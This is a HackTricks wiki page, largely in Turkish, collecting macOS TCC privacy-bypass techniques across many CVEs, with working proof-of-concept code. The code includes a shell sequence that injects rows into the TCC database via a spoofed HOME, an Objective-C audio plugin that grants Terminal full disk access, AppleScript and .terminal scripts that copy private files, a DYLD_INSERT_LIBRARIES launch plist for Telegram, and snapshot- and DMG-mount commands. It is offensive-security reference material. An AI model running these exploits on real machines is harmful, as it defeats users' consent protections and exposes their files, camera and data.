# macOS TCC Bypass'ları

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## İşlevselliğe Göre

### Yazma Bypass'ı

Bu bir bypass değil, TCC'nin nasıl çalıştığıdır: **Yazma işlemlerinden korumaz**. Terminal **bir kullanıcının Masaüstünü okumak için erişime sahip değilse bile, ona yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** yeni **dosyaya** eklenir, böylece **yaratıcı uygulama** onu okumak için erişim kazanır.

### TCC ClickJacking

Kullanıcının **bunu fark etmeden kabul etmesini sağlamak için TCC isteminin üzerine bir pencere koymak** mümkündür. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**'de bulabilirsiniz.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Arbitrarı isimle istek

Saldırgan, **`Info.plist`** dosyasında **herhangi bir isimle uygulama oluşturabilir** (örneğin Finder, Google Chrome...) ve bunu bazı TCC korumalı konumlara erişim istemesi için ayarlayabilir. Kullanıcı, bu erişimi talep eden uygulamanın meşru olduğunu düşünecektir.\
Ayrıca, **meşru uygulamayı Dock'tan kaldırmak ve sahte olanı yerleştirmek** mümkündür, böylece kullanıcı sahte olanı tıkladığında (aynı simgeyi kullanabilir) meşru olanı çağırabilir, TCC izinleri isteyebilir ve bir kötü amaçlı yazılım çalıştırabilir, bu da kullanıcının meşru uygulamanın erişim talep ettiğine inanmasına neden olur.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC için:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

Varsayılan olarak, **SSH üzerinden erişim "Tam Disk Erişimi"** gerektiriyordu. Bunu devre dışı bırakmak için, listede yer alması ancak devre dışı bırakılması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):

![](<../../../../../.gitbook/assets/image (1077).png>)

Bazı **kötü amaçlı yazılımların bu korumayı nasıl aşabildiğine dair örnekler bulabilirsiniz**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Artık SSH'yi etkinleştirmek için **Tam Disk Erişimi** gerektiğini unutmayın.
{% endhint %}

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** niteliği, **belirli bir uygulamaya onu okuma izni vermek için** dosyalara verilir. Bu nitelik, bir dosyayı bir uygulamanın üzerine **sürükleyip bıraktığınızda** veya bir kullanıcı bir dosyayı **çift tıkladığında** varsayılan uygulama ile açıldığında ayarlanır.

Bu nedenle, bir kullanıcı **tüm uzantıları işlemek için kötü amaçlı bir uygulama kaydedebilir** ve herhangi bir dosyayı **açmak için** Launch Services'i çağırabilir (böylece kötü amaçlı dosya okuma erişimi kazanır).

### iCloud

**`com.apple.private.icloud-account-access`** yetkisi ile **`com.apple.iCloudHelper`** XPC servisi ile iletişim kurmak mümkündür, bu da **iCloud token'ları** sağlar.

**iMovie** ve **Garageband** bu yetkiye sahipti ve diğerleri de izin verdi.

Bu yetkiden **icloud token'ları almak için** istismara dair daha fazla **bilgi** için konuşmayı kontrol edin: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** iznine sahip bir uygulama, **diğer Uygulamaları kontrol edebilir**. Bu, diğer Uygulamalara verilen izinleri **istismar edebileceği** anlamına gelir.

Apple Script'leri hakkında daha fazla bilgi için kontrol edin:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Örneğin, bir Uygulama **`iTerm`** üzerinde **Otomasyon iznine** sahipse, bu örnekte **`Terminal`** iTerm üzerinde erişime sahiptir:

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm Üzerinde

FDA'ya sahip olmayan Terminal, iTerm'i çağırabilir, bu da ona sahip ve eylemleri gerçekleştirmek için kullanılabilir:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Over Finder

Ya da bir uygulama Finder üzerinde erişime sahipse, bu gibi bir script kullanabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Uygulama davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanındaki **tccd daemon** **`HOME`** **env** değişkenini **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** adresinden TCC kullanıcı veritabanına erişmek için kullanıyor.

[Tam bu Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemon'u mevcut kullanıcının alanında `launchd` aracılığıyla çalıştığı için, ona iletilen **tüm ortam değişkenlerini kontrol etmek** mümkündür.\
Böylece, bir **saldırgan `$HOME` ortam** değişkenini **`launchctl`** içinde **kontrol edilen** bir **dizine** işaret edecek şekilde ayarlayabilir, **TCC** daemon'unu **yeniden başlatabilir** ve ardından **TCC veritabanını doğrudan değiştirebilir** ve kendisine **mevcut tüm TCC yetkilerini** verebilir, son kullanıcıyı asla uyarmadan.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notlar

Notlar TCC korumalı alanlara erişime sahipti ancak bir not oluşturulduğunda bu **korumasız bir alanda oluşturuluyor**. Bu nedenle, notlardan korumalı bir dosyayı bir notta (yani korumasız bir alanda) kopyalamasını isteyebilir ve ardından dosyaya erişebilirsiniz:

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokasyon

`/usr/libexec/lsd` ikili dosyası, **nullfs** montajı oluşturmasına izin veren `com.apple.private.nullfs_allow` yetkisine sahipti ve her dosyaya erişim için **`kTCCServiceSystemPolicyAllFiles`** ile `com.apple.private.tcc.allow` yetkisine sahipti.

"Library" klasörüne karantina niteliği eklemek, **`com.apple.security.translocation`** XPC hizmetini çağırmak ve ardından Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** olarak eşlemek mümkündü; burada Library içindeki tüm belgeler **erişilebilir** hale geliyordu.

### CVE-2023-38571 - Müzik & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ilginç bir özelliğe sahiptir: Çalıştığında, **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** klasörüne bırakılan dosyaları kullanıcının "medya kütüphanesine" **ithal** eder. Dahası, **`rename(a, b);`** gibi bir şey çağırır; burada `a` ve `b` şunlardır:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Bu **`rename(a, b);`** davranışı bir **Race Condition**'a karşı savunmasızdır, çünkü `Automatically Add to Music.localized` klasörüne sahte bir **TCC.db** dosyası koymak ve ardından yeni klasör (b) oluşturulduğunda dosyayı kopyalayıp silmek ve onu **`~/Library/Application Support/com.apple.TCC`**'ye yönlendirmek mümkündür.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Eğer **`SQLITE_SQLLOG_DIR="path/folder"`** ise, bu temelde **her açık veritabanının o yola kopyalanması** anlamına gelir. Bu CVE'de bu kontrol, **TCC veritabanını FDA ile açacak bir süreç içinde** **SQLite veritabanına yazmak** için kötüye kullanıldı ve ardından **`SQLITE_SQLLOG_DIR`** ile dosya adında bir **sembolik bağlantı** kullanılarak, o veritabanı **açıldığında**, kullanıcı **TCC.db** açılanla **üst üste yazıldı**.\
**Daha fazla bilgi** [**yazıda**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **ve**[ **sohbette**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Eğer ortam değişkeni **`SQLITE_AUTO_TRACE`** ayarlanmışsa, **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **kaydetmeye** başlayacaktır. Birçok uygulama bu kütüphaneyi kullandığı için, tüm SQLite sorgularını kaydetmek mümkündü.

Birçok Apple uygulaması, TCC korumalı bilgilere erişmek için bu kütüphaneyi kullandı.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Bu **env değişkeni `Metal` çerçevesi tarafından kullanılır** ve çeşitli programlar için bir bağımlılıktır, en önemlisi FDA'ya sahip olan `Music` programıdır.

Aşağıdakileri ayarlamak: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Eğer `path` geçerli bir dizinse, hata tetiklenecek ve programda neler olduğunu görmek için `fs_usage` kullanabiliriz:

* `path/.dat.nosyncXXXX.XXXXXX` (X rastgele) adında bir dosya `open()` edilecektir.
* bir veya daha fazla `write()` dosyaya içerik yazacaktır (bunu kontrol edemiyoruz).
* `path/.dat.nosyncXXXX.XXXXXX` `renamed()` olacak ve `path/name` olarak değiştirilecektir.

Bu, geçici bir dosya yazımıdır ve ardından **`rename(old, new)`** **güvenli değildir.**

Güvenli değildir çünkü **eski ve yeni yolları ayrı ayrı çözmesi gerekir**, bu da biraz zaman alabilir ve Race Condition'a karşı savunmasız olabilir. Daha fazla bilgi için `xnu` fonksiyonu `renameat_internal()`'a bakabilirsiniz.

{% hint style="danger" %}
Yani, temelde, eğer ayrı bir dizinden yeniden adlandırma yapan ayrıcalıklı bir işlem varsa, bir RCE kazanabilir ve farklı bir dosyaya erişmesini sağlayabilirsiniz veya bu CVE'de olduğu gibi, ayrıcalıklı uygulamanın oluşturduğu dosyayı açıp bir FD saklayabilirsiniz.

Eğer yeniden adlandırma, kontrol ettiğiniz bir dizine erişirse ve kaynak dosyayı değiştirmiş veya ona bir FD'ye sahipseniz, hedef dosyayı (veya dizini) bir symlink'e işaret edecek şekilde değiştirirsiniz, böylece istediğiniz zaman yazabilirsiniz.
{% endhint %}

Bu, CVE'deki saldırıydı: Örneğin, kullanıcının `TCC.db` dosyasını üzerine yazmak için şunları yapabiliriz:

* `/Users/hacker/ourlink` oluşturup `/Users/hacker/Library/Application Support/com.apple.TCC/`'ye işaret ettirin.
* `/Users/hacker/tmp/` dizinini oluşturun.
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` ayarlayın.
* bu env değişkeni ile `Music` çalıştırarak hatayı tetikleyin.
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X rastgele) dosyasının `open()` işlemini yakalayın.
* burada bu dosyayı yazma için de `open()` ediyoruz ve dosya tanımlayıcısını tutuyoruz.
* `/Users/hacker/tmp` ile `/Users/hacker/ourlink`'i **bir döngü içinde atomik olarak değiştirin**.
* bunu, yarış penceresi oldukça dar olduğu için başarılı olma şansımızı artırmak için yapıyoruz, ancak yarışı kaybetmenin önemsiz bir dezavantajı var.
* biraz bekleyin.
* şansımızı test edin.
* eğer değilse, en baştan tekrar çalıştırın.

Daha fazla bilgi için [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Artık, `MTL_DUMP_PIPELINES_TO_JSON_FILE` env değişkenini kullanmaya çalışırsanız, uygulamalar başlatılmayacaktır.
{% endhint %}

### Apple Remote Desktop

Root olarak bu hizmeti etkinleştirebilir ve **ARD ajanı tam disk erişimine sahip olacaktır**; bu da bir kullanıcı tarafından yeni bir **TCC kullanıcı veritabanı** kopyalamak için kötüye kullanılabilir.

## **NFSHomeDirectory** ile

TCC, kullanıcının kaynaklara erişimini kontrol etmek için kullanıcının HOME klasöründe bir veritabanı kullanır: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Bu nedenle, kullanıcı TCC'yi farklı bir klasöre işaret eden bir $HOME env değişkeni ile yeniden başlatmayı başarırsa, kullanıcı **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC veritabanı oluşturabilir ve TCC'yi herhangi bir TCC iznini herhangi bir uygulamaya vermesi için kandırabilir.

{% hint style="success" %}
Apple'ın, **`NFSHomeDirectory`** niteliğinde kullanıcının profilinde saklanan ayarı **`$HOME`** değeri için kullandığını unutmayın, bu nedenle bu değeri değiştirme iznine sahip bir uygulamayı ele geçirirseniz (**`kTCCServiceSystemPolicySysAdminFiles`**), bu seçeneği bir TCC bypass ile **silahlandırabilirsiniz**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**ilk POC**, kullanıcının **HOME** klasörünü değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Hedef uygulama için bir _csreq_ blob alın.
2. Gerekli erişim ve _csreq_ blob ile sahte bir _TCC.db_ dosyası yerleştirin.
3. Kullanıcının Dizin Servisleri kaydını [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile dışa aktarın.
4. Kullanıcının ana dizinini değiştirmek için Dizin Servisleri kaydını değiştirin.
5. Değiştirilen Dizin Servisleri kaydını [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile içe aktarın.
6. Kullanıcının _tccd_ sürecini durdurun ve süreci yeniden başlatın.

İkinci POC, `com.apple.private.tcc.allow` ile `kTCCServiceSystemPolicySysAdminFiles` değerine sahip olan **`/usr/libexec/configd`** kullandı.\
**`-t`** seçeneği ile **`configd`** çalıştırmak mümkün olduğunda, bir saldırgan **yüklemek için özel bir Bundle** belirtebilir. Bu nedenle, istismar, kullanıcının ana dizinini değiştirme yöntemini **`dsexport`** ve **`dsimport`** ile **`configd` kod enjeksiyonu** ile değiştirir.

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) bakın.

## Süreç enjeksiyonu ile

Bir süreç içine kod enjekte etmenin ve TCC ayrıcalıklarını kötüye kullanmanın farklı teknikleri vardır:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Ayrıca, TCC'yi atlatmak için bulunan en yaygın süreç enjeksiyonu **pluginler (load library)** aracılığıyladır.\
Pluginler, genellikle kütüphaneler veya plist biçiminde olan ek kodlardır ve **ana uygulama tarafından yüklenir** ve onun bağlamında çalıştırılır. Bu nedenle, ana uygulama TCC kısıtlı dosyalara erişime sahipse (verilen izinler veya haklar aracılığıyla), **özel kod da buna sahip olacaktır**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` uygulaması **`kTCCServiceSystemPolicySysAdminFiles`** ayrıcalığına sahipti, **`.daplug`** uzantılı pluginler yükledi ve **sertleştirilmiş** çalışma zamanına sahip değildi.

Bu CVE'yi silahlandırmak için, **`NFSHomeDirectory`** **değiştirilir** (önceki ayrıcalığı kötüye kullanarak) böylece kullanıcıların TCC veritabanını ele geçirebiliriz ve TCC'yi atlatabiliriz.

Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bakın.

### CVE-2020-29621 - Coreaudiod

İkili **`/usr/sbin/coreaudiod`** `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` ayrıcalıklarına sahipti. İlk **kod enjeksiyonuna izin verirken** ikincisi **TCC'yi yönetme** erişimi sağlıyordu.

Bu ikili, `/Library/Audio/Plug-Ins/HAL` klasöründen **üçüncü taraf eklentileri** yüklemeye izin veriyordu. Bu nedenle, bu PoC ile **bir eklenti yüklemek ve TCC izinlerini kötüye kullanmak** mümkündü:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.

### Cihaz Soyutlama Katmanı (DAL) Eklentileri

Core Media I/O aracılığıyla kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** ile uygulamalar) **bu eklentileri** `/Library/CoreMediaIO/Plug-Ins/DAL` konumundan yükler (SIP kısıtlı değil).

Oraya ortak bir **yapıcı** ile bir kütüphane depolamak, **kod enjekte etmek** için işe yarayacaktır.

Birçok Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulaması `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkilerine sahipti:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Daha fazla bilgi için [**orijinal rapora göz atın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

İkili `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** yetkilerine sahipti, bu da sürece kod enjekte etmeye ve TCC ayrıcalıklarını kullanmaya olanak tanıyordu.

### CVE-2023-26818 - Telegram

Telegram **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** yetkilerine sahipti, bu nedenle **izinlerine erişim sağlamak** için kötüye kullanılabiliyordu, örneğin kamerayla kayıt yapmak. [**Payload'ı yazımda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Bir kütüphaneyi yüklemek için env değişkeninin nasıl kullanılacağını not edin; bu kütüphaneyi enjekte etmek için **özel bir plist** oluşturuldu ve **`launchctl`** kullanılarak başlatıldı:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Açık çağrılarla

Sandboxed olsalar bile **`open`** komutunu çağırmak mümkündür.

### Terminal Scriptleri

Terminale **Tam Disk Erişimi (FDA)** vermek, teknoloji insanları tarafından kullanılan bilgisayarlarda oldukça yaygındır. Ve bununla birlikte **`.terminal`** scriptlerini çağırmak mümkündür.

**`.terminal`** scriptleri, **`CommandString`** anahtarında yürütülecek komutla birlikte bu gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konumda bir terminal betiği yazabilir ve bunu şu şekilde başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mount ederek

### CVE-2020-9771 - mount\_apfs TCC atlatma ve ayrıcalık yükseltme

**Herhangi bir kullanıcı** (hatta ayrıcalıksız olanlar bile) bir zaman makinesi anlık görüntüsü oluşturabilir ve monte edebilir ve o anlık görüntünün **TÜM dosyalarına** erişebilir.\
Gerekli olan **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) **Tam Disk Erişimi** (FDA) erişimine sahip olmasıdır (`kTCCServiceSystemPolicyAllfiles`), bu da bir yönetici tarafından verilmelidir.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyasını monte etme

TCC DB dosyası korunsa bile, yeni bir TCC.db dosyasını **dizinin üzerine monte etmek** mümkündü:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.

### Location Services

There is a third TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed to **access location services**.\
The folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was possible to mount our own plist.

## By startup apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## By grep

In several occasions files will store sensitive information like emails, phone numbers, messages... in non protected locations (which count as a vulnerability in Apple).

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

This doesn't work anymore, but it [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
